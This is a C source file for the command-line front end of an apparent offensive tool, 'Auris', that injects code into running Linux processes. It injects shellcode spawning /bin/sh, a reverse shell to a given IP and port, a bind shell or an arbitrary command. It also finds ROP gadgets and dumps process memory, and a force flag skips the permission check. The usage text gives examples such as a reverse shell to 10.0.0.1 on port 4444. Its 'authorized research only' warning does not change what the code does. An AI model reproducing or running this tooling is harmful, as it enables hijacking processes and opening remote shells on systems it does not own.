/*
 * Auris - Process Injection CLI
 * Command-line interface for injection operations
 * 
 * WARNING: For authorized security research only.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <signal.h>

#include "auris.h"
#include "inject.h"

/* Injection subcommands */
typedef enum {
    INJECT_CMD_NONE = 0,
    INJECT_CMD_LIST,        /* List injectable processes */
    INJECT_CMD_INFO,        /* Show process info */
    INJECT_CMD_MAPS,        /* Show memory maps */
    INJECT_CMD_SHELLCODE,   /* Inject shellcode */
    INJECT_CMD_LIBRARY,     /* Inject shared library */
    INJECT_CMD_GADGETS,     /* Find ROP gadgets */
    INJECT_CMD_DUMP,        /* Dump memory region */
    INJECT_CMD_HELP,
} inject_cmd_t;

/* Shellcode types */
typedef enum {
    SC_EXEC_SH = 0,
    SC_REVERSE_SHELL,
    SC_BIND_SHELL,
    SC_EXEC_CMD,
} shellcode_type_t;

/* CLI options */
typedef struct {
    inject_cmd_t command;
    pid_t target_pid;
    shellcode_type_t shellcode_type;
    char ip[64];
    uint16_t port;
    char command_str[256];
    char library_path[MAX_PATH_LEN];
    char binary_path[MAX_PATH_LEN];
    uint64_t address;
    size_t length;
    bool verbose;
    bool force;
} inject_opts_t;

static volatile sig_atomic_t interrupted = 0;

static void signal_handler(int sig)
{
    (void)sig;
    interrupted = 1;
}

static void print_inject_usage(void)
{
    printf(
        "Auris Process Injection Framework\n"
        "\n"
        "WARNING: For authorized security research and penetration testing only.\n"
        "Unauthorized use is illegal.\n"
        "\n"
        "Usage: auris inject <command> [options]\n"
        "\n"
        "Commands:\n"
        "  list                    List injectable processes\n"
        "  info -p <pid>           Show detailed process info\n"
        "  maps -p <pid>           Show process memory maps\n"
        "  shellcode -p <pid>      Inject and execute shellcode\n"
        "  library -p <pid>        Inject shared library\n"
        "  gadgets -b <binary>     Find ROP gadgets in binary\n"
        "  dump -p <pid>           Dump memory region\n"
        "\n"
        "Shellcode Options:\n"
        "  -t, --type TYPE         Shellcode type:\n"
        "                            exec_sh      - Execute /bin/sh\n"
        "                            reverse      - Reverse shell\n"
        "                            bind         - Bind shell\n"
        "                            exec_cmd     - Execute command\n"
        "  -i, --ip IP             IP address for reverse shell\n"
        "  -P, --port PORT         Port for reverse/bind shell\n"
        "  -c, --cmd COMMAND       Command to execute\n"
        "\n"
        "Library Injection:\n"
        "  -l, --library PATH      Path to shared library (.so)\n"
        "\n"
        "Memory Options:\n"
        "  -a, --address ADDR      Memory address (hex)\n"
        "  -n, --length LEN        Length in bytes\n"
        "\n"
        "General Options:\n"
        "  -p, --pid PID           Target process ID\n"
        "  -b, --binary PATH       Binary file path\n"
        "  -v, --verbose           Verbose output\n"
        "  -f, --force             Force operation (skip checks)\n"
        "  -h, --help              Show this help\n"
        "\n"
        "Examples:\n"
        "  auris inject list\n"
        "  auris inject info -p 1234\n"
        "  auris inject maps -p 1234\n"
        "  auris inject shellcode -p 1234 -t exec_sh\n"
        "  auris inject shellcode -p 1234 -t reverse -i 10.0.0.1 -P 4444\n"
        "  auris inject shellcode -p 1234 -t bind -P 4444\n"
        "  auris inject library -p 1234 -l ./payload.so\n"
        "  auris inject gadgets -b /lib/aarch64-linux-gnu/libc.so.6\n"
        "  auris inject dump -p 1234 -a 0x400000 -n 4096\n"
        "\n"
    );
}

static int cmd_list(inject_opts_t *opts)
{
    (void)opts;
    
    pid_t *pids = NULL;
    size_t count = 0;
    
    sg_error_t err = sg_inject_find_targets(&pids, &count);
    if (err != SG_OK) {
        fprintf(stderr, "Error finding targets: %s\n", sg_strerror(err));
        return 1;
    }
    
    printf("Injectable Processes (%zu found):\n", count);
    printf("%-8s %-16s %-8s %s\n", "PID", "NAME", "UID", "PATH");
    printf("%-8s %-16s %-8s %s\n", "---", "----", "---", "----");
    
    for (size_t i = 0; i < count && !interrupted; i++) {
        sg_inject_target_t target;
        if (sg_inject_get_target_info(pids[i], &target) == SG_OK) {
            bool can_inject = false;
            sg_inject_check_permissions(pids[i], &can_inject);
            
            printf("%-8d %-16s %-8u %s%s\n",
                   target.pid,
                   target.comm,
                   target.uid,
                   target.exe_path,
                   can_inject ? "" : " [no access]");
        }
    }
    
    free(pids);
    return 0;
}

static int cmd_info(inject_opts_t *opts)
{
    if (opts->target_pid <= 0) {
        fprintf(stderr, "Error: -p/--pid required\n");
        return 1;
    }
    
    sg_inject_target_t target;
    sg_error_t err = sg_inject_get_target_info(opts->target_pid, &target);
    if (err != SG_OK) {
        fprintf(stderr, "Error getting process info: %s\n", sg_strerror(err));
        return 1;
    }
    
    bool can_inject = false;
    sg_inject_check_permissions(opts->target_pid, &can_inject);
    
    printf("Process Information\n");
    printf("===================\n");
    printf("PID:        %d\n", target.pid);
    printf("Name:       %s\n", target.comm);
    printf("Path:       %s\n", target.exe_path);
    printf("UID:        %u\n", target.uid);
    printf("GID:        %u\n", target.gid);
    printf("Injectable: %s\n", can_inject ? "Yes" : "No");
    
    return 0;
}

static int cmd_maps(inject_opts_t *opts)
{
    if (opts->target_pid <= 0) {
        fprintf(stderr, "Error: -p/--pid required\n");
        return 1;
    }
    
    sg_memory_map_t *map = NULL;
    sg_error_t err = sg_inject_parse_maps(opts->target_pid, &map);
    if (err != SG_OK) {
        fprintf(stderr, "Error parsing maps: %s\n", sg_strerror(err));
        return 1;
    }
    
    printf("Memory Map for PID %d (%zu regions)\n", opts->target_pid, map->region_count);
    printf("%-18s %-18s %-5s %s\n", "START", "END", "PERM", "PATH");
    printf("%-18s %-18s %-5s %s\n", "-----", "---", "----", "----");
    
    for (size_t i = 0; i < map->region_count; i++) {
        sg_memory_region_t *r = &map->regions[i];
        
        char perms[5] = "----";
        if (r->readable) perms[0] = 'r';
        if (r->writable) perms[1] = 'w';
        if (r->executable) perms[2] = 'x';
        perms[3] = r->is_private ? 'p' : 's';
        
        printf("0x%016lx 0x%016lx %s %s",
               r->start, r->end, perms, r->pathname);
        
        /* Mark special regions */
        if (r == map->text_region) printf(" [TEXT]");
        if (r == map->stack_region) printf(" [STACK]");
        if (r == map->heap_region) printf(" [HEAP]");
        if (r == map->libc_region) printf(" [LIBC]");
        if (r == map->vdso_region) printf(" [VDSO]");
        
        printf("\n");
    }
    
    sg_inject_free_maps(map);
    return 0;
}

static int cmd_shellcode(inject_opts_t *opts)
{
    if (opts->target_pid <= 0) {
        fprintf(stderr, "Error: -p/--pid required\n");
        return 1;
    }
    
    /* Check permissions first */
    bool can_inject = false;
    sg_inject_check_permissions(opts->target_pid, &can_inject);
    
    if (!can_inject && !opts->force) {
        fprintf(stderr, "Error: Cannot inject into PID %d (permission denied)\n",
                opts->target_pid);
        fprintf(stderr, "Use -f/--force to attempt anyway\n");
        return 1;
    }
    
    /* Get shellcode */
    sg_shellcode_t *shellcode = NULL;
    sg_error_t err;
    
    switch (opts->shellcode_type) {
        case SC_EXEC_SH:
            err = sg_shellcode_exec_sh(&shellcode);
            break;
            
        case SC_REVERSE_SHELL:
            if (opts->ip[0] == '\0' || opts->port == 0) {
                fprintf(stderr, "Error: Reverse shell requires -i/--ip and -P/--port\n");
                return 1;
            }
            err = sg_shellcode_reverse_shell(opts->ip, opts->port, &shellcode);
            break;
            
        case SC_BIND_SHELL:
            if (opts->port == 0) {
                fprintf(stderr, "Error: Bind shell requires -P/--port\n");
                return 1;
            }
            err = sg_shellcode_bind_shell(opts->port, &shellcode);
            break;
            
        case SC_EXEC_CMD:
            if (opts->command_str[0] == '\0') {
                fprintf(stderr, "Error: exec_cmd requires -c/--cmd\n");
                return 1;
            }
            err = sg_shellcode_exec_cmd(opts->command_str, &shellcode);
            break;
            
        default:
            fprintf(stderr, "Error: Unknown shellcode type\n");
            return 1;
    }
    
    if (err != SG_OK) {
        fprintf(stderr, "Error creating shellcode: %s\n", sg_strerror(err));
        return 1;
    }
    
    printf("Shellcode: %s\n", shellcode->name);
    printf("Description: %s\n", shellcode->description);
    printf("Size: %zu bytes\n", shellcode->length);
    
    if (opts->verbose) {
        printf("\nShellcode bytes:\n");
        sg_inject_hexdump(shellcode->code, shellcode->length, 0);
    }
    
    /* Initialize injection context */
    sg_inject_ctx_t ctx;
    err = sg_inject_init(&ctx, opts->target_pid);
    if (err != SG_OK) {
        fprintf(stderr, "Error initializing injection: %s\n", sg_strerror(err));
        sg_shellcode_free(shellcode);
        return 1;
    }
    
    printf("\nInjecting into PID %d...\n", opts->target_pid);
    
    /* Perform injection */
    sg_inject_result_t result;
    err = sg_inject_shellcode(&ctx, shellcode, &result);
    
    if (result.success) {
        printf("Injection successful!\n");
        printf("Injected at: 0x%lx\n", result.injected_addr);
        printf("Return value: 0x%lx\n", result.return_value);
        printf("Execution time: %lu ns\n", result.execution_time_ns);
    } else {
        fprintf(stderr, "Injection failed: %s\n", result.error_msg);
    }
    
    sg_inject_cleanup(&ctx);
    sg_shellcode_free(shellcode);
    
    return result.success ? 0 : 1;
}

static int cmd_gadgets(inject_opts_t *opts)
{
    if (opts->binary_path[0] == '\0') {
        fprintf(stderr, "Error: -b/--binary required\n");
        return 1;
    }
    
    printf("Finding ROP gadgets in %s...\n", opts->binary_path);
    
    sg_gadget_db_t *db = NULL;
    sg_error_t err = sg_rop_find_gadgets(opts->binary_path, 0, &db);
    
    if (err != SG_OK) {
        fprintf(stderr, "Error finding gadgets: %s\n", sg_strerror(err));
        return 1;
    }
    
    /* Print gadgets */
    sg_rop_print_gadgets(db, opts->verbose ? 0 : 50);
    
    /* Print useful gadget summary */
    printf("\nUseful Gadgets Summary:\n");
    
    sg_rop_gadget_t *g;
    
    g = sg_rop_find_gadget_by_type(db, GADGET_TYPE_LOAD_X0 | GADGET_TYPE_RET);
    if (g) printf("  Load X0: 0x%lx - %s\n", g->address, g->disasm);
    
    g = sg_rop_find_gadget_by_type(db, GADGET_TYPE_LOAD_X1 | GADGET_TYPE_RET);
    if (g) printf("  Load X1: 0x%lx - %s\n", g->address, g->disasm);
    
    g = sg_rop_find_gadget_by_type(db, GADGET_TYPE_LOAD_X8 | GADGET_TYPE_RET);
    if (g) printf("  Load X8: 0x%lx - %s\n", g->address, g->disasm);
    
    g = sg_rop_find_gadget_by_type(db, GADGET_TYPE_SYSCALL);
    if (g) printf("  Syscall: 0x%lx - %s\n", g->address, g->disasm);
    
    g = sg_rop_find_gadget_by_type(db, GADGET_TYPE_STACK_PIVOT | GADGET_TYPE_RET);
    if (g) printf("  Stack Pivot: 0x%lx - %s\n", g->address, g->disasm);
    
    sg_rop_free_gadgets(db);
    return 0;
}

static int cmd_dump(inject_opts_t *opts)
{
    if (opts->target_pid <= 0) {
        fprintf(stderr, "Error: -p/--pid required\n");
        return 1;
    }
    
    if (opts->address == 0) {
        fprintf(stderr, "Error: -a/--address required\n");
        return 1;
    }
    
    if (opts->length == 0) {
        opts->length = 256;  /* Default */
    }
    
    /* Attach to process */
    sg_inject_ctx_t ctx;
    sg_error_t err = sg_inject_init(&ctx, opts->target_pid);
    if (err != SG_OK) {
        fprintf(stderr, "Error: %s\n", sg_strerror(err));
        return 1;
    }
    
    err = sg_inject_attach(&ctx);
    if (err != SG_OK) {
        fprintf(stderr, "Error attaching: %s\n", sg_strerror(err));
        sg_inject_cleanup(&ctx);
        return 1;
    }
    
    /* Read memory */
    uint8_t *buf = malloc(opts->length);
    if (buf == NULL) {
        sg_inject_cleanup(&ctx);
        return 1;
    }
    
    ssize_t n = sg_inject_read_mem(opts->target_pid, opts->address,
                                    buf, opts->length);
    
    if (n < 0) {
        fprintf(stderr, "Error reading memory\n");
        free(buf);
        sg_inject_cleanup(&ctx);
        return 1;
    }
    
    printf("Memory dump from PID %d at 0x%lx (%zd bytes):\n\n",
           opts->target_pid, opts->address, n);
    
    sg_inject_hexdump(buf, n, opts->address);
    
    free(buf);
    sg_inject_cleanup(&ctx);
    return 0;
}

int sg_inject_main(int argc, char *argv[])
{
    inject_opts_t opts = {0};
    opts.shellcode_type = SC_EXEC_SH;
    
    /* Set up signal handler */
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    /* Parse subcommand */
    if (argc < 2) {
        print_inject_usage();
        return 1;
    }
    
    const char *subcmd = argv[1];
    
    if (strcmp(subcmd, "list") == 0) {
        opts.command = INJECT_CMD_LIST;
    } else if (strcmp(subcmd, "info") == 0) {
        opts.command = INJECT_CMD_INFO;
    } else if (strcmp(subcmd, "maps") == 0) {
        opts.command = INJECT_CMD_MAPS;
    } else if (strcmp(subcmd, "shellcode") == 0) {
        opts.command = INJECT_CMD_SHELLCODE;
    } else if (strcmp(subcmd, "library") == 0) {
        opts.command = INJECT_CMD_LIBRARY;
    } else if (strcmp(subcmd, "gadgets") == 0) {
        opts.command = INJECT_CMD_GADGETS;
    } else if (strcmp(subcmd, "dump") == 0) {
        opts.command = INJECT_CMD_DUMP;
    } else if (strcmp(subcmd, "help") == 0 || strcmp(subcmd, "-h") == 0) {
        print_inject_usage();
        return 0;
    } else {
        fprintf(stderr, "Unknown command: %s\n", subcmd);
        print_inject_usage();
        return 1;
    }
    
    /* Parse options */
    static struct option long_options[] = {
        {"pid",     required_argument, 0, 'p'},
        {"type",    required_argument, 0, 't'},
        {"ip",      required_argument, 0, 'i'},
        {"port",    required_argument, 0, 'P'},
        {"cmd",     required_argument, 0, 'c'},
        {"library", required_argument, 0, 'l'},
        {"binary",  required_argument, 0, 'b'},
        {"address", required_argument, 0, 'a'},
        {"length",  required_argument, 0, 'n'},
        {"verbose", no_argument,       0, 'v'},
        {"force",   no_argument,       0, 'f'},
        {"help",    no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };
    
    int opt;
    optind = 2;  /* Skip subcommand */
    
    while ((opt = getopt_long(argc, argv, "p:t:i:P:c:l:b:a:n:vfh",
                               long_options, NULL)) != -1) {
        switch (opt) {
            case 'p':
                opts.target_pid = atoi(optarg);
                break;
            case 't':
                if (strcmp(optarg, "exec_sh") == 0) {
                    opts.shellcode_type = SC_EXEC_SH;
                } else if (strcmp(optarg, "reverse") == 0) {
                    opts.shellcode_type = SC_REVERSE_SHELL;
                } else if (strcmp(optarg, "bind") == 0) {
                    opts.shellcode_type = SC_BIND_SHELL;
                } else if (strcmp(optarg, "exec_cmd") == 0) {
                    opts.shellcode_type = SC_EXEC_CMD;
                } else {
                    fprintf(stderr, "Unknown shellcode type: %s\n", optarg);
                    return 1;
                }
                break;
            case 'i':
                sg_safe_strncpy(opts.ip, optarg, sizeof(opts.ip));
                break;
            case 'P':
                opts.port = atoi(optarg);
                break;
            case 'c':
                sg_safe_strncpy(opts.command_str, optarg, sizeof(opts.command_str));
                break;
            case 'l':
                sg_safe_strncpy(opts.library_path, optarg, sizeof(opts.library_path));
                break;
            case 'b':
                sg_safe_strncpy(opts.binary_path, optarg, sizeof(opts.binary_path));
                break;
            case 'a':
                opts.address = strtoull(optarg, NULL, 0);
                break;
            case 'n':
                opts.length = strtoull(optarg, NULL, 0);
                break;
            case 'v':
                opts.verbose = true;
                break;
            case 'f':
                opts.force = true;
                break;
            case 'h':
                print_inject_usage();
                return 0;
            default:
                return 1;
        }
    }
    
    /* Execute command */
    switch (opts.command) {
        case INJECT_CMD_LIST:
            return cmd_list(&opts);
        case INJECT_CMD_INFO:
            return cmd_info(&opts);
        case INJECT_CMD_MAPS:
            return cmd_maps(&opts);
        case INJECT_CMD_SHELLCODE:
            return cmd_shellcode(&opts);
        case INJECT_CMD_GADGETS:
            return cmd_gadgets(&opts);
        case INJECT_CMD_DUMP:
            return cmd_dump(&opts);
        case INJECT_CMD_LIBRARY:
            fprintf(stderr, "Library injection not yet implemented\n");
            return 1;
        default:
            print_inject_usage();
            return 1;
    }
}
